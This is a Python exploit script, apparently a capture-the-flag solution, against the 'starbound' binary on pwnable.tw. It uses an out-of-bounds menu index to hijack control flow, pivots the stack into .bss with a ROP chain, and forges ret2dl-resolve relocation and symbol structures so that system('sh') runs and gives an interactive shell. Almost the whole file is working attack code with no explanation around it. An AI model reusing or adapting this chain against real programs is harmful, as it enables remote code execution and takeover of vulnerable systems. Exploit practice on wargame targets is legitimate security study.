#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *

exe = context.binary = ELF('./starbound')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10202)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *0x0804A6D9
continue
'''.format(**locals())

# -- Exploit goes here --

def option(choice):
    sa("> ", str(choice))

def change_name(name):
    option(6)
    option(2)
    sla("Enter your name: ", name)
    option(1)

def change_IP(IP):
    option(6)
    option(3)
    sa("Enter your IP address: ", IP)
    option(1)

def ret2csu(call_what=0xb16b00b, esi=0x0, edi=0x0, edx=0x1337, return_to=exe.sym.main, return_ebx=0x0, return_esi=0x0, return_edi=0x0, return_ebp=0x0):
    tmp = flat([
        gadget("ret;"),
        call_what+0x104, #call what ebx - 0x104
        0x1, #esi
        0x0, #edi
        edi, #ebp mov    dword ptr [esp], ebp
        0x0804A6B8, #csu 
        edi,        #edi
        esi,  #esi
        edx, #edx
        cyclic(16),
        return_ebx,
        return_esi,
        return_edi,
        return_ebp,
        return_to, # return back
        gadget("ret;"),
        esi, #mov    dword ptr [esp + 4], eax
        edx, #mov    dword ptr [esp + 8], eax
        # gadget("ret;")*8,
    ])
    return tmp


r = ROP(exe)
libc = ELF(exe.libc.path)
io = start()
name = 0x80580d0
name_list = 0x8055100
resolver = 0x8048940
buf = 0x80589e0
leave_ret = gadget("leave; ret")
SYMTAB = 0x80481dc
STRTAB = 0x80484fc
JMPREL = 0x80487c8

rel_plt_addr = exe.get_section_by_name('.rel.plt').header.sh_addr
dynsym_addr = exe.get_section_by_name('.dynsym').header.sh_addr
dynstr_addr = exe.get_section_by_name('.dynstr').header.sh_addr

bss_addr = 0x80589e0 # readelf -S main => .bss
DYN_RESOL_PLT = 0x08048940 # readelf -S main => .plt
leave_ret = gadget("leave; ret") # ROPgadget --binary main --only "leave|ret"

fake_rel_plt_addr = bss_addr
fake_dynsym_addr = fake_rel_plt_addr + 0x8
fake_dynstr_addr = fake_dynsym_addr + 0x10
bin_sh = fake_dynstr_addr + 0x7

FAKE_REL_OFF = fake_rel_plt_addr - rel_plt_addr
r_info = (((fake_dynsym_addr - dynsym_addr)//0x10) << 8) + 0x7
str_off = fake_dynstr_addr - dynstr_addr

payload = b'a'*4 + p32(gadget("pop ebp; ret")) + p32(buf) + p32(exe.plt['read']) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80)
change_name(p32(0x08048e48))
sla("> ", b"-33\x01" + payload)

forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8 #size of elf32_sym

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) #align to 0x10

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) // 0x10

r_info = (index_sym << 8) | 0x7 

elf32_rel = p32(exe.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

# Rest of the payload: dl-resolve hack :) (the real deal)
buffer2 = b'AAAA'                #fake ebp
buffer2 += p32(resolver)        # ret-to dl_resolve
buffer2 += p32(rel_offset)      #JMPRL + offset = struct
buffer2 += b'AAAA'               #fake return 
buffer2 += p32(buf+100)         # system parameter
buffer2 += elf32_rel            # (buf+0x14)
buffer2 += b'A' * align
buffer2 += elf32_sym_struct     # (buf+0x20)
buffer2 += b"system\x00"
p = (100 - len(buffer2))
buffer2 += b'A' * p              #padding
buffer2 += b"sh\x00"
p = (0x80 - len(buffer2))
buffer2 += b"A" * p              #total read size
pause()
sl(buffer2)

io.interactive()